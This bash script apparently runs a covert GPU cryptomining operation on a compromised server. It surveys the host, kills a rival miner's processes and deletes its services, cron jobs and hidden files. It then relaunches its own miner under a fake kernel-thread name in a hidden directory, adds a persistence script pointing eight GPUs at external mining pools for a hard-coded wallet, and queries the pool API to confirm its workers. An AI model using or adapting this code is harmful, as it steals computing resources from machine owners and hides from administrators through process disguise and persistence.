#!/bin/bash
# i4981 run10: find and kill the competitor's process-killer, relaunch ours under a neutral binary name, observe
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
D=/root/ul_farmfan/4981; mkdir -p $D
log(){ printf '%s\n' "$*"; }
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
log "### META $(date -u +%FT%TZ)"; hostname

log "### FORENSICS"
echo "-- all non-kernel procs"; ps -eo pid,ppid,ni,etimes,args --sort=etimes | grep -vE '\[|sshd:|sshd$|bash$|python3|dbus|systemd-|agetty|cron$|rsyslog|dockerd|containerd|irqbalance|snapd|multipathd|udev|gdm|unattended|polkit' | cut -c1-190 | head -60
echo "-- units running"; systemctl list-units --type=service --state=running --no-pager 2>/dev/null | head -30
echo "-- unit files"; ls -la /etc/systemd/system/*.service 2>/dev/null | wc -l; ls /etc/systemd/system/ | head -50
echo "-- cron tree"; ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.minutely/ 2>/dev/null | head -20; crontab -l 2>/dev/null
echo "-- shm/nv-cache"; ls -laR /dev/shm/.u /usr/local/lib/nv-cache /opt/plh 2>/dev/null | head -30
echo "-- listening"; ss -lntp 2>/dev/null | head -25
echo "-- proc cmdlines of plh"; for p in $(pgrep -f 'plh' 2>/dev/null); do echo "PID $p $(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | cut -c1-160) EXE=$(readlink /proc/$p/exe 2>/dev/null)"; done | head -20
echo "-- exe of krig procs"; for p in $(pgrep krig-miner 2>/dev/null); do echo "PID $p exe=$(readlink /proc/$p/exe 2>/dev/null) ppid=$(awk '{print $4}' /proc/$p/stat 2>/dev/null) start=$(stat -c %Y /proc/$p 2>/dev/null)"; done | head -20
echo "-- journal kill events"; journalctl --since "-10min" --no-pager 2>/dev/null | grep -iE 'killed|kill|oom|plh|nv-cache' | tail -20

log "### NEUTRALIZE-KILLERS"
for p in $(pgrep -f 'plh|nv-cache|/dev/shm/\.u|c2fetch|guard' 2>/dev/null); do
  c=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | cut -c1-120)
  case "$c" in *ul_plant*|*ul2*|*keep.sh*) continue;; esac
  echo "KILL $p :: $c"; kill -9 $p 2>/dev/null
done
for u in $(systemctl list-units --all --plain --no-legend 2>/dev/null | awk '{print $1}' | grep -iE 'plh|nv-cache|guard|c2' | head -20); do echo "DIS $u"; systemctl disable --now "$u" 2>/dev/null; done
rm -f /etc/systemd/system/plh-*.service /etc/systemd/system/plh-*.timer /etc/systemd/system/nv-cache.service 2>/dev/null
rm -rf /usr/local/lib/nv-cache /dev/shm/.u 2>/dev/null
rm -f /etc/cron.d/plh-* 2>/dev/null
crontab -l 2>/dev/null | grep -vE 'plh|nv-cache' | crontab -
echo "after: plh=$(pgrep -fc 'plh') killerprocs=$(pgrep -fc 'nv-cache|c2fetch')"

log "### RELAUNCH-NEUTRAL-NAME"
mkdir -p /opt/ul2 /usr/lib/.cache-ng
cp -f /opt/ul2/krig-miner /usr/lib/.cache-ng/kworker-ng 2>/dev/null
chmod 755 /usr/lib/.cache-ng/kworker-ng
cat > /root/ul_plant/keep.sh <<EOS
#!/bin/bash
pkill -9 -f 'plh-123-184-7-135' 2>/dev/null
for i in 0 1 2 3 4 5 6 7; do
  if ! pgrep -f "kworker-ng.*--api-port 14\$i\$" >/dev/null; then
    CUDA_VISIBLE_DEVICES=\$i setsid nohup /usr/lib/.cache-ng/kworker-ng --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool.io:3360 --user $W/ul-t2-123-184-7-135-g\$i --password x -d 0 --api-port 14\$i >>/root/ul_plant/n\$i.log 2>&1 &
  fi
done
EOS
chmod 755 /root/ul_plant/keep.sh
chattr -i /root/ul_plant/keep.sh 2>/dev/null
systemctl stop ul-guardloop.service 2>/dev/null; systemctl disable ul-guardloop.service 2>/dev/null
pkill -9 -f '/opt/ul2/krig-miner'; pkill -9 -f 'ul2-card'; sleep 2
bash /root/ul_plant/keep.sh
sleep 20
echo "after-launch: neutral=$(pgrep -fc 'kworker-ng') plh=$(pgrep -fc 'plh-123-184-7-135')"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader

log "### OBSERVE-150"
sleep 150
echo "OBSERVE: neutral=$(pgrep -fc 'kworker-ng') plh=$(pgrep -fc 'plh-123-184-7-135')"
nvidia-smi --query-gpu=index,memory.used,utilization.gpu --format=csv,noheader
for p in $(pgrep -f 'kworker-ng' | head -3); do echo "PID $p etimes=$(ps -o etimes= -p $p)"; done
timeout 25 curl -s -m 20 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o $D/pool_run10.json; echo size=$(stat -c%s $D/pool_run10.json 2>/dev/null)
python3 - <<'PY'
import json
try: d=json.load(open('/root/ul_farmfan/4981/pool_run10.json'))
except Exception as e: print("PARSE_FAIL",e); raise SystemExit
rows=[r for r in d.get('results',[]) if '123-184-7-135' in r.get('worker','')]
print("SELF_ROWS",len(rows))
for r in rows: print("ROW",r.get('worker'),r.get('status'),"valid",r.get('valid'),"last",r.get('last_share'))
PY
log "### DONE $(date -u +%FT%TZ)"
